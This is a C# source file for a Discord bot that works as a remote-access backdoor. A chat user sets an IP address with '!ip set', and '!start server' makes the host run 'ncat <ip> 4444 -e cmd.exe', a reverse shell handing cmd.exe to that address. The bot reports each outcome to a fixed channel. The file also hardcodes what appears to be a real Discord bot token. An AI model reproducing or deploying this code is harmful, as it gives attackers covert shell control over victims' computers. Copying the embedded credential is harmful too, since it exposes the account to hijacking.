using Discord;
using Discord.Commands;
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Threading.Tasks;

public class Program
{
    private static string TOKEN = "MTIxMzkzNDMxMDI4MTcwNzU5MQ.GSLJXU.2TqcDeLUtIbGGNfY2CfnHVDqhK8j9asp8t1JoE";
    private static string current_ip = null;
    private static DiscordSocketClient bot;
    
    public static void Main(string[] args)
    {
        MainAsync().GetAwaiter().GetResult();
    }

    public static async Task MainAsync()
    {
        bot = new DiscordSocketClient();
        bot.Log += Log;
        bot.Ready += Ready;
        bot.MessageReceived += MessageReceived;

        await bot.LoginAsync(TokenType.Bot, TOKEN);
        await bot.StartAsync();

        await Task.Delay(-1);
    }

    private static Task Log(LogMessage arg)
    {
        Console.WriteLine(arg);
        return Task.CompletedTask;
    }

    private static Task Ready()
    {
        Console.WriteLine($"Logged in as {bot.CurrentUser} (ID: {bot.CurrentUser.Id})");
        return Task.CompletedTask;
    }

    private static async Task MessageReceived(SocketMessage message)
    {
        if (message.Author.Id == bot.CurrentUser.Id)
        {
            return;
        }

        Console.WriteLine($"[{message.Channel}] {message.Author}: {message.Content}");

        if (message.Reference != null && message.Reference.Resolved.Id == bot.CurrentUser.Id)
        {
            await message.Channel.SendMessageAsync("I heard you!");
        }

        if (message.Content.StartsWith("!start server"))
        {
            if (current_ip != null)
            {
                await message.Channel.SendMessageAsync("Attempting to start server connection...");
                await StartConnection(current_ip);
            }
            else
            {
                await message.Channel.SendMessageAsync("IP address not set. Use the !ip set command");
            }
        }

        if (message.Content.StartsWith("!ip set"))
        {
            string[] words = message.Content.Split(" ");
            if (words.Length < 3)
            {
                await message.Channel.SendMessageAsync("Please provide an IP address after the command. Example: !ip set 192.168.1.208");
            }
            else
            {
                string new_ip = words[2];
                current_ip = new_ip;
                await message.Channel.SendMessageAsync($"IP set to {current_ip}");
            }
        }
    }

    private static async Task StartConnection(string current_ip)
    {
        string command = $"ncat {current_ip} 4444 -e cmd.exe";
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = $"/c {command}";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardInput = true;
        process.Start();

        string stdout = await process.StandardOutput.ReadToEndAsync();
        string stderr = await process.StandardError.ReadToEndAsync();

        if (process.ExitCode == 0)
        {
            await bot.GetChannel(1213939499986587739).SendMessageAsync("Session was successful");
        }
        else
        {
            await bot.GetChannel(1213939499986587739).SendMessageAsync($"Failed to execute command {command}. Error: {stderr}");
        }
    }
}

